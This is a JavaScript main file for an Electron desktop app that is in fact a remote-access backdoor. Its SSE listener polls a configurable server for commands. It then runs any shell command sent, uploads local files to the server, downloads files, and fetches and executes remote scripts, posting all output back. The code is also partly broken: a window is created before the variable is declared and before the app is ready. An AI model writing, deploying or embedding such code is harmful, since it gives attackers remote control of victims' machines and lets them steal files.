const { app, BrowserWindow } = require('electron');
const path = require('path');
const http = require('http');
const https = require('https');
const fs = require('fs');

// Configuration
const SERVER_URL = 'http://<SERVER-IP>:8085'; // Remplacez par l'URL de votre serveur
const SSE_URL = `${SERVER_URL}/stream`;
const POST_URL = `${SERVER_URL}/post`;
const UPLOAD_URL = `${SERVER_URL}/upload`;
const DOWNLOAD_URL = `${SERVER_URL}/download`;

mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
        nodeIntegration: true, // Permet d'utiliser Node.js dans le Renderer Process
        contextIsolation: false, // Désactivé pour permettre l'accès à Node.js
    },
});

let mainWindow;

// Fonction pour exécuter une commande shell
const execCommand = (command) => {
    return new Promise((resolve, reject) => {
        const { exec } = require('child_process');
        exec(command, (error, stdout, stderr) => {
            if (error) {
                reject(stderr || error.message);
            } else {
                resolve(stdout || stderr);
            }
        });
    });
};

// Fonction pour télécharger un fichier depuis le serveur
const downloadFile = async (filename) => {
    const filePath = `./${filename}`;
    const file = fs.createWriteStream(filePath);

    return new Promise((resolve, reject) => {
        http.get(`${DOWNLOAD_URL}/${filename}`, (response) => {
            if (response.statusCode === 200) {
                response.pipe(file);
                file.on('finish', () => {
                    file.close();
                    resolve(`File '${filename}' downloaded successfully.`);
                });
            } else {
                reject(`Error downloading file '${filename}': ${response.statusCode}`);
            }
        }).on('error', (err) => {
            reject(`Error downloading file '${filename}': ${err.message}`);
        });
    });
};

// Fonction pour envoyer un fichier au serveur
const uploadFile = async (filePath) => {
    if (!fs.existsSync(filePath)) {
        throw new Error(`File '${filePath}' does not exist.`);
    }

    const boundary = `----WebKitFormBoundary${Math.random().toString(16).slice(2)}`;
    const fileContent = fs.readFileSync(filePath);
    const payload = [
        `--${boundary}`,
        `Content-Disposition: form-data; name="file"; filename="${filePath}"`,
        `Content-Type: application/octet-stream`,
        ``,
        fileContent,
        `--${boundary}--`,
        ``
    ].join('\r\n');

    return new Promise((resolve, reject) => {
        const req = http.request(UPLOAD_URL, {
            method: 'POST',
            headers: {
                'Content-Type': `multipart/form-data; boundary=${boundary}`,
                'Content-Length': Buffer.byteLength(payload)
            }
        }, (res) => {
            if (res.statusCode === 200) {
                resolve(`File '${filePath}' uploaded successfully to the server.`);
            } else {
                reject(`Error uploading file '${filePath}': ${res.statusCode}`);
            }
        });

        req.on('error', (err) => {
            reject(`Error uploading file '${filePath}': ${err.message}`);
        });

        req.write(payload);
        req.end();
    });
};

// Fonction pour injecter un script depuis une URL et l'exécuter
const injectScript = async (url) => {
    return new Promise((resolve, reject) => {
        const protocol = url.startsWith('https') ? https : http;

        protocol.get(url, (response) => {
            let script = '';
            response.on('data', (chunk) => {
                script += chunk;
            });

            response.on('end', async () => {
                try {
                    const result = await execCommand(script);
                    resolve(`Script executed successfully. Output:\n${result}`);
                } catch (err) {
                    reject(`Error executing script from URL '${url}': ${err}`);
                }
            });
        }).on('error', (err) => {
            reject(`Error fetching script from URL '${url}': ${err.message}`);
        });
    });
};

// Fonction pour envoyer une réponse au serveur
const sendResponse = async (response) => {
    const postData = `databack: ${response}`;

    return new Promise((resolve, reject) => {
        const req = http.request(POST_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain',
                'Content-Length': Buffer.byteLength(postData),
            },
        }, (res) => {
            if (res.statusCode === 200) {
                resolve('Response sent to server.');
            } else {
                reject(`Error sending response to server: ${res.statusCode}`);
            }
        });

        req.on('error', (err) => {
            reject(`Error sending response to server: ${err.message}`);
        });

        req.write(postData);
        req.end();
    });
};

// Connexion au serveur SSE
const connectToSSE = () => {
    const req = http.request(SSE_URL, { method: 'GET' }, (res) => {
        if (res.statusCode !== 200) {
            console.error(`Failed to connect to SSE: ${res.statusCode}`);
            return;
        }

        res.on('data', async (chunk) => {
            const lines = chunk.toString().split('\n');
            for (const line of lines) {
                if (line.startsWith('data:')) {
                    const msg = line.substring(5).trim();
                    console.log(`SSE message received: ${msg}`);

                    let response;

                    try {
                        if (msg.startsWith('download ')) {
                            const filename = msg.substring(9).trim();
                            response = await downloadFile(filename);
                        } else if (msg.startsWith('upload ')) {
                            const filePath = msg.substring(7).trim();
                            response = await uploadFile(filePath);
                        } else if (msg.startsWith('inject ')) {
                            const url = msg.substring(7).trim();
                            response = await injectScript(url);
                        } else {
                            // Exécuter une commande shell
                            response = await execCommand(msg);
                        }
                    } catch (err) {
                        response = err.toString();
                    }

                    console.log(`Command result: ${response}`);

                    try {
                        await sendResponse(response);
                    } catch (err) {
                        console.error(err);
                    }
                }
            }
        });

        res.on('end', () => {
            console.log('SSE connection closed by server.');
            setTimeout(connectToSSE, 5000); // Reconnect après 5 secondes
        });
    });

    req.on('error', (err) => {
        console.error(`Error with SSE connection: ${err.message}`);
        setTimeout(connectToSSE, 5000); // Reconnect après 5 secondes
    });

    req.end();
};

// Démarrer l'application Electron
app.on('ready', () => {
    mainWindow = new BrowserWindow({
        width: 800,
        height: 600,
        webPreferences: {
            preload: path.join(__dirname, 'preload.js'),
            contextIsolation: true,
        },
    });

    mainWindow.loadFile('index.html');

    // Démarrer la connexion SSE
    connectToSSE();
});

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        app.quit();
    }
});